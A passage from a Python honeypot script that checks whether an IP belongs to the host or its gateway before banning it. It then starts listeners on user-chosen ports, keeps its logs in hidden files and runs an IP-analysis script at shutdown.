            with os.popen("ip addr | grep 'inet ' | awk '{print $2}' | cut -d/ -f1") as f:
                for line in f:
                    self_ips.add(line.strip())
        else:
            with os.popen("ipconfig") as f:
                for line in f:
                    if 'IPv4 Address' in line or 'IPv6 Address' in line:
                        ip_addr = line.split(':')[-1].strip()
                        self_ips.add(ip_addr)
        if ip in self_ips:
            return True
    except Exception:
        pass
    # Gateway (best effort, Linux/WSL/Unix)
    try:
        if os.name != 'nt':
            with os.popen("ip route | grep default | awk '{print $3}'") as f:
                for line in f:
                    if ip == line.strip():
                        return True
        else:
            # Windows: parse 'route print' for gateway
            with os.popen("route print 0.0.0.0") as f:
                for line in f:
                    if '0.0.0.0' in line:
                        parts = line.split()
                        if len(parts) >= 4 and ip == parts[2]:
                            return True
    except Exception:
        pass
    # RFC1918 private ranges (optional: skip banning whole LAN)
    if ip.startswith(('192.168.', '10.', '172.16.', '172.17.', '172.18.', '172.19.', '172.20.', '172.21.', '172.22.', '172.23.', '172.24.', '172.25.', '172.26.', '172.27.', '172.28.', '172.29.', '172.30.', '172.31.')):
        return False  # Allow banning LAN attackers, but not self/gateway
    return False

# Entry point
if __name__ == "__main__":
    # Startup sequence with enhanced effects
    startup_sequence()
    
    # Create hidden monitoring files silently
    hidden_files = create_hidden_files()
    # Set global hidden file paths for use everywhere
    if not HIDDEN_DB_FILE or not HIDDEN_LOG_FILE:
        print_colored("❌ Failed to set hidden file paths. Exiting.", Colors.RED, bold=True)
        sys.exit(1)
    
    # Setup logging after hidden files are created
    setup_logging()
    
    # Initialize database silently
    init_db()
    
    # Restore banned IPs from previous sessions silently
    restore_banned_ips()
    
    print_colored("🚀 Enhanced Honeypot Starting...", Colors.CYAN, bold=True)
    print_colored("=" * 50, Colors.YELLOW)
    # Hidden files info removed for cleaner output
    
    # Show statistics animation silently (hidden)
    # print_colored("📊 System Statistics:", Colors.PURPLE, bold=True)
    # show_stats_animation()
    
    ports = input(Colors.CYAN + "Enter ports (comma-separated) or press Enter for default: " + Colors.END).strip()
    if ports:
        # Only keep numeric values
        ports = [int(p) for p in ports.split(",") if p.strip().isdigit()]
        if not ports:
            ports = DEFAULT_PORTS
    else:
        ports = DEFAULT_PORTS
    
    print_colored("🎯 Starting honeypot services...", Colors.GREEN, bold=True)
    clean_effect("STARTING_SERVICES", 1.0)
    
    threading.Thread(target=spinner, daemon=True).start()
    start_honeypot(ports)
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        RUNNING = False
        print_colored("\n🛑 Shutdown requested...", Colors.RED, bold=True)
        glitch_effect("SHUTDOWN_INITIATED", 0.5)
        shutdown_sequence()
        # Run analyze_ips.py in the background after shutdown
        try:
            import subprocess
            subprocess.Popen([
                sys.executable, os.path.join(os.path.dirname(__file__), 'analyze_ips.py')
            ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            print_colored("[INFO] IP analysis started in background.", Colors.BLUE)
        except Exception as e:
            print_colored(f"[WARN] Could not start IP analysis: {e}", Colors.YELLOW)
        # Clean up hidden files (optional)
        # for file_path in hidden_files:
        #     try:
        #         if os.path.exists(file_path):
        #             os.remove(file_path)
        #             print(f"🗑️ Removed: {file_path}")
        #     except Exception as e:
        #         print(f"❌ Error removing {file_path}: {e}")
        time.sleep(1) 